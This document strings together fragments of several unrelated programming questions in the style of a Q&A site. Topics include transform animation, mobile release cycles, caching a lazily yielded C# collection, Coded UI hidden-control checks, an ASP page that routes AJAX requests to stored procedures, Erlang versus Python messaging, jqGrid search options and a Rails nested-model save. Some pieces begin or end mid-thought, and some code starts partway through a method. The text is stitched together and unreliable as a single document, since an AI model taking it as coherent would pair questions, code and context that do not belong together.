If I'm on the right track understanding this, is it possible to express this in a single transform?  Or must I, for each effective frame of animation, rotate the original upright image slightly around the z axis and then lay the result down with an x axis rotation?  I saw a question/answer that talked about combining transforms, but that was a scale transform followed by a rotation transform.  I have messed around with transforming the transform, but isn't doing what I think I should be getting (i.e. passing the result of one transform into the transform argument of the next seemed to just execute one completely and then animate the other).

Coming from a web shop where I implemented continuous deployment, where we used to deploy dozens of times every day, this is very frustrating...

What are industry's best practices to beat the current marketplaces inherent slowness so we could to iterate faster, experiment and not have to deal with such a long tail of back-compat support?

Requirements wise, the app needs to:

 - Run on iOS, Android, perhaps later on other devices
 - Access a few of the local resources, such as address book, push notifications
 - Store data locally (currently I use Core Data)
 - Well.. look good, perform animations, not be clunky, feel right... This section is negotiable and it's hard to quantify it but users will know when I bargin too low...

Please note that the same (or very similar) question was also asked on Quora but was left unanswered, so maybe SO is better home for it...

        {
            yield return new ModuleData(m.Element(""ModuleID"").Value);
        }
    }

Initially the above code is great since there is no need to evaluate the entire collection if it is not needed.

However, once all the Modules have been enumerated once, it becomes more expensive to repeatedly query the XDocument when there is no change.

So, as a performance improvement:

    public IEnumerable<ModuleData> ListModules()
    {
        if (Modules == null)
        {
            Modules = new List<ModuleData>();
            foreach (XElement m in Source.Descendants(""Module""))
            {
                Modules.Add(new ModuleData(m.Element(""ModuleID"").Value, 1, 1));
            }
        }
        return Modules;
    }

Which is great if I am repeatedly using the entire list but not so great otherwise.

Is there a middle ground where I can yield return until the entire list has been iterated, then cache it and serve the cache to subsequent requests?

the problem on my issue is to check if a control is behind another control or is hidden for a CODED UI TEST.

the starting point is the following

[1]: http://up.picr.de/10436769hv.jpg ""startingpointimage""

searching for ""blabla"" a text message will be written on the panel that no items could found. I highlighted it with the crosshair of the map recorder. 

[2]: http://up.picr.de/10436770vo.jpg ""searchblablaimage""

I will see these properties for highlighted control

[3]: http://up.picr.de/10436771kx.jpg ""propertiesimage""

deleting ""blabla"" in the search the no-items-found-message disappears but the text control already exists behind the panel (I suggest).

[4]: http://up.picr.de/10436772xh.jpg ""deleteblablaimage""

And the properties for that controle are already the same!

how can I define the different state in my coded UI test? has anyone an idea?

Actually the website use:

 - Ajax (client site with prototype.js)
 - ASP (vb script server side)
 - SQL Server 2005
 - IIS 7 as webserver

This website use hundred of store procedures and the requests are made by an `ajax call` and **only 1 ASP page** that contain an huge `select case`

Shortly an example: JAVASCRIPT + PROTOTYPE

    var data = {
    	action:		'NEWS',
    	callback:	'doNews',
    	param1:		$('text_example').value,
    	......:		..........};
    AjaxGet(data); // perform a call using another function + prototype

SERVER SIDE ASP

    <% ......
    select case request(""Action"")
    case ""NEWS""
    	With cmmDB
    		.ActiveConnection = Conn
    		.CommandText = ""sp_NEWS_TO_CALL_for_example""
    		.CommandType = adCmdStoredProc 
    
    		Set par0DB = .CreateParameter(""Param1"", adVarchar, adParamInput,6)
    		Set par1DB = .CreateParameter(""....."", adInteger, adParamInput)
    		' ........ ' can be more parameters

    		RecodsetToJSON rs, jsa ' create JSON response using a sub
    	End With
    .... %>

So as you can see i have a page ASP that have a **lot of CASE** and this page **answer to all the ajax request** in the site.

My question are:

 1. Instead to have many CASES is possible to create dynamic vb code that parse the ajax request and create dynamically the call to the desired SP (also implementing the parameters passed by JS)?
 2. Or what is the best approach to handle situation like this, by using the advantages of .Net + protoype or jQuery ?
 3. How the big sites handle situation like this ? by creating 1 page for request ?

Erlang Style - Messages are sent and queued into the mailbox of the receiving process. From there they are removed in a FIFO basis. Once the first process sends the message it is free to continue.

Python Style - Process a queues up to send to process b. b is currently performing some other action, so a is frozen until b is ready to receive. Once b opens a read channel a sends the data then they both continue

Now I see the pros of the Erlang method being that you don't have any blocked processes. If b never is able to receive, a can still continue. However I have noticed in some programs I have written, that it is possible for Erlang message boxes to get full of hundreds (or thousands) of messages since the inflow of messages is greater than the outflow.

Now I haven't written a large program in either framework/language so I'm wondering your experiences are with this, and if it's something I should even worry about.

    function autoFillSearch(request, response, columnToSearchName) {
        var paramters = {
            colName: columnToSearchName,
            prefixText: request.term
        };
        $.ajax({
            url: './ViewNQueryData.asmx/AutoCompleteSearch',
            type: 'POST',
            dataType: 'json',
            contentType: 'application/json; charset=utf-8',
            data: JSON.stringify(paramters),
            success: function (data) {
                response($.each(data.d, function (index, value) {
                    return {
                        label: value,
                        value: index
                    }
                }));
            }
        });
    }

The problem is that new the colModels have the search option that were created the second time and dont have my specific ""sopt"" i want them to have....


I there any way of changing the second searchoption so that it will get the ""sopt"" option from the original colMadel?


Thank you in advance.

On my website, members of the site have two parts: an account and the type of account. First you create an account and then your type is defined later. In this case, we're working with a user type account. Users and accounts are two different models. This code create a user membership to a project. If the the user is not signed up to the website yet, this particular form creates the membership and also creates a new account of the type user.

The user part of the model seems to work (ie first and last name are being saved), however, the account part of the model (email) is not being saved. Any recommendations? My guess is that the e-mail parameter is not being passed correctly to the Account model, though not quite sure how to check which parameters are being sent either.
